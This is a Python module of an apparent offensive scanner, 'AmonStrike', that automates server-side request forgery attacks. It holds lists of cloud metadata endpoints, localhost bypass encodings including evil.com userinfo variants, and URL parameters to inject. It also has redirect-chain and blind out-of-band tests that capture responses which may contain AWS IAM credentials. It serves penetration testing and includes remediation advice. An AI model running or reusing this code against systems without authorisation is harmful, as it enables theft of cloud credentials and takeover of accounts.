"""
AmonStrike — SSRF Module
Server-Side Request Forgery — gateway to cloud credential theft.
"""
import re
import uuid
from .base import BaseModule
try:
    from core.interactsh import OOBDetector
    _HAS_OOB = True
except Exception:
    _HAS_OOB = False

CLOUD_METADATA = {
    "AWS":   "http://169.254.169.254/latest/meta-data/",
    "GCP":   "http://metadata.google.internal/computeMetadata/v1/",
    "Azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "OCI":   "http://169.254.169.254/opc/v1/instance/",
    "Docker":"http://172.17.0.1/",
    "K8s":   "http://kubernetes.default.svc/",
}

BYPASS_VARIANTS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.01/",        # Octal IP
    "http://2130706433/",          # Decimal IP for 127.0.0.1
    "http://127.1/",
    "http://127.000.000.001/",
    "http://0x7f000001/",          # Hex IP
    "http://127.0.0.1:80/",
    "http://127.0.0.1%23@evil.com/",
    "http://evil.com@127.0.0.1/",
]

SSRF_PARAMS = [
    "url","redirect","next","return","callback","webhook",
    "dest","destination","uri","link","src","source","goto",
    "image","img","path","fetch","load","endpoint","proxy",
    "target","site","out","feed","data","host","to","ref",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "AccessKeyId", "iam/security-credentials",
    "computeMetadata", "metadata/instance", "local-ipv4",
    "root:x", "daemon:", "DOCUMENT_ROOT", "SSH_CLIENT",
]


class SsrfModule(BaseModule):
    NAME        = "ssrf"
    DESCRIPTION = "SSRF — cloud metadata, OOB, bypass variants, redirect chains"

    def run(self):
        self.log("Testing SSRF...")

        # Setup OOB for blind SSRF
        oob = None
        if _HAS_OOB:
            try:
                oob = OOBDetector()
                self.info["oob_url"] = oob.url
            except Exception:
                pass

        # Test all SSRF parameters
        self._test_url_params()

        # Test webhook/import features
        self._test_functional_ssrf()

        # Test redirect-based SSRF
        self._test_redirect_ssrf()

        # OOB blind SSRF test
        oob_finds = self._test_oob_ssrf()
        for f in oob_finds:
            self.findings.append(f)

        self.log(f"SSRF complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_url_params(self):
        """Test query parameters that take URLs."""
        for param in SSRF_PARAMS:
            # Test cloud metadata directly
            for cloud, meta_url in CLOUD_METADATA.items():
                r = self.get(params={param: meta_url})
                if r and any(sig in r.text for sig in SSRF_SIGNATURES):
                    self._report_ssrf(param, meta_url, r, cloud)
                    return

            # Test internal bypass variants
            for bypass in BYPASS_VARIANTS[:5]:
                r = self.get(params={param: bypass})
                if r and r.status_code == 200:
                    if any(sig in r.text for sig in
                           ["root:x","daemon","uid=","HOME="]):
                        self._report_ssrf(param, bypass, r, "Internal")
                        return

    def _test_functional_ssrf(self):
        """Test features designed to fetch URLs (PDF gen, image import, etc.)."""
        ssrf_endpoints = [
            ("/api/webhook", "url"),
            ("/api/fetch",   "url"),
            ("/api/import",  "url"),
            ("/api/export",  "url"),
            ("/api/preview", "url"),
            ("/screenshot",  "url"),
            ("/pdf",         "url"),
            ("/render",      "url"),
        ]
        for path, param in ssrf_endpoints:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue
            for cloud, meta_url in CLOUD_METADATA.items():
                r2 = self.post(path, json={param: meta_url})
                if not r2:
                    r2 = self.get(path, params={param: meta_url})
                if r2 and any(sig in r2.text for sig in SSRF_SIGNATURES):
                    # Verify it's real metadata, not just homepage HTML
                    if self._is_real_ssrf(r2.text, r.text if r else ""):
                        self._report_ssrf(param, meta_url, r2, cloud)
                        return

    def _test_redirect_ssrf(self):
        """Test open redirects that can be chained for SSRF."""
        redirect_params = ["redirect","next","return","goto","url","location"]
        for param in redirect_params:
            for meta_url in list(CLOUD_METADATA.values())[:2]:
                r = self.get(params={param: meta_url}, allow_redirects=True)
                if r and any(sig in r.text for sig in SSRF_SIGNATURES):
                    r0 = self.get("")
                    if self._is_real_ssrf(r.text, r0.text if r0 else ""):
                        self._report_ssrf(param, meta_url, r, "Redirect Chain")

    def _is_real_ssrf(self, response_text: str, baseline_text: str) -> bool:
        """Verify SSRF is real."""
        real_sigs = [
            "ami-id","instance-id","AccessKeyId","SecretAccessKey",
            "iam/security-credentials","computeMetadata","local-ipv4",
            "placement","availability-zone","security-groups","instance-type",
            "metadata.google.internal","169.254.169.254",
        ]
        # Must contain real metadata
        if not any(sig in response_text for sig in real_sigs):
            return False
        # Must differ from baseline
        if baseline_text and len(baseline_text) > 100:
            ratio = abs(len(response_text) - len(baseline_text)) / max(len(baseline_text),1)
            if ratio < 0.03:
                return False
        return True

    def _test_oob_ssrf(self) -> list:
        """Test SSRF via OOB DNS callback - confirms blind SSRF."""
        findings = []
        try:
            from core.interactsh import OOBDetector
            oob = OOBDetector()
            params = ["url","redirect","next","callback","webhook","src","dest"]
            for param in params:
                for payload in oob.ssrf_payloads()[:2]:
                    r = self.get(params={param: payload})
                    if not r:
                        continue
            # Wait and check for DNS hit
            result = oob.check(wait=8)
            if result.get("has_hit"):
                hit = result["hits"][0]
                findings.append({
                    "title":       "Blind SSRF Confirmed via OOB DNS Callback",
                    "severity":    "CRITICAL",
                    "module":      "ssrf",
                    "description": (
                        "Server made an outbound DNS/HTTP request to attacker-controlled "
                        "server, confirming blind SSRF. Server can reach external hosts."
                    ),
                    "evidence": (
                        f"OOB URL: {result['url']}\n"
                        f"Hit type: {hit.get('type','')}\n"
                        f"Remote IP: {hit.get('remote_ip','')}\n"
                        f"Timestamp: {hit.get('timestamp','')}"
                    ),
                    "remediation": "Implement URL allowlist. Block outbound requests to external hosts.",
                    "url": self.url,
                    "cve": "CWE-918",
                })
            oob.stop()
        except Exception:
            pass
        return findings

    def _report_ssrf(self, param: str, payload: str, r, cloud: str):
        # Identify what was exposed
        exposed = []
        if "AccessKeyId" in r.text:
            exposed.append("AWS IAM credentials")
        if "ami-id" in r.text or "instance-id" in r.text:
            exposed.append("AWS instance metadata")
        if "computeMetadata" in r.text:
            exposed.append("GCP metadata")
        if not exposed:
            exposed = ["internal server response"]

        self.add_finding(
            title       = f"SSRF — {cloud} Cloud Metadata Exposed via '{param}'",
            severity    = "CRITICAL",
            description = (
                f"Server-Side Request Forgery via '{param}' parameter reaches "
                f"{cloud} cloud metadata service. "
                f"Exposed: {', '.join(exposed)}. "
                f"Can escalate to full cloud account takeover."
            ),
            evidence    = (
                f"Parameter: {param}\nPayload: {payload}\n"
                f"Cloud: {cloud}\nExposed data: {', '.join(exposed)}\n"
                f"Response: {r.text[:400]}"
            ),
            remediation = (
                "Block requests to 169.254.169.254 at network level. "
                "Validate and whitelist allowed URL schemes/hosts. "
                "Enable IMDSv2 on all EC2 instances. "
                "Never allow user-controlled URLs in server-side HTTP calls."
            ),
            url         = self.url,
            parameter   = param,
            payload     = payload,
            cve         = "CWE-918",
        )
        self.info["ssrf_param"]   = param
        self.info["ssrf_payload"] = payload
        self.info["ssrf_cloud"]   = cloud
